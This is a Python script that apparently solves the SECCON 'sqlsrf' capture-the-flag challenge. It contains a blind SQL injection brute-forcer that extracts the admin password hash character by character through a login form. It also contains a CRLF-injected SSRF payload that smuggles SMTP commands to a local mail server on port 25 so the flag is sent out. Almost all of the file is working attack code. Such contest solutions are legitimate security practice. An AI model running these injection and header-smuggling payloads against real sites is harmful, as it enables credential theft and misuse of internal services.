#!/usr/bin/env python
# -*- coding: utf-8 -*-

import string
import requests

url = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"

s = requests.Session()

DEBUG = True
DEBUG = False


def dprint(s):
    if DEBUG:
        print s


def login(user="", pwd="user"):
    data = {
        "user": user,
        "pass": pwd,
        "login": "1",
        "save": "1"
    }
    r = s.post(url, data=data)
    if "Login Error!</h2>" in r.content:
        dprint("Login Error...")
        return False
    elif "Database Error!" in r.content:
        dprint("Database Error...")
        return False
    else:
        dprint(r.content)
    return True


def brute():
    sql = "' union select '55e49bbb64d0e064e09355fb0f8a02b2' from users where username='admin' and substr(password, %d, 1)='%s"
    charset = string.hexdigits[:16]
    enpwd = ""
    for i in range(1, 33):
        for c in charset:
            print "test index %d char %c\r" % (i, c),
            if login(sql % (i, c)):
                enpwd += c
                print enpwd
                break
    return enpwd


if __name__ == '__main__':
    # brute()
    pwd = "d2f37e101c0e76bcc90b5634a5510f64"  # by brute
    pwd = "Yes!Kusomon!!"  # by remember decrypt

    payload = "127.0.0.1%0d%0aHELO 127.0.0.1%0aMAIL FROM%3a%3cyoumail%40gmail.com%3e%0aRCPT TO%3a%3croot%3e%0aDATA%0aFrom%3a youmail%40gmail.com%0aTo%3a root%0aSubject%3a give me flag%0d%0a.%0d%0a%0aQUIT%0a:25"
    # Encrypted-FLAG:
    # 37208e07f86ba78a7416ecd535fd874a3b98b964005a5503bcaa41a1c9b42a19
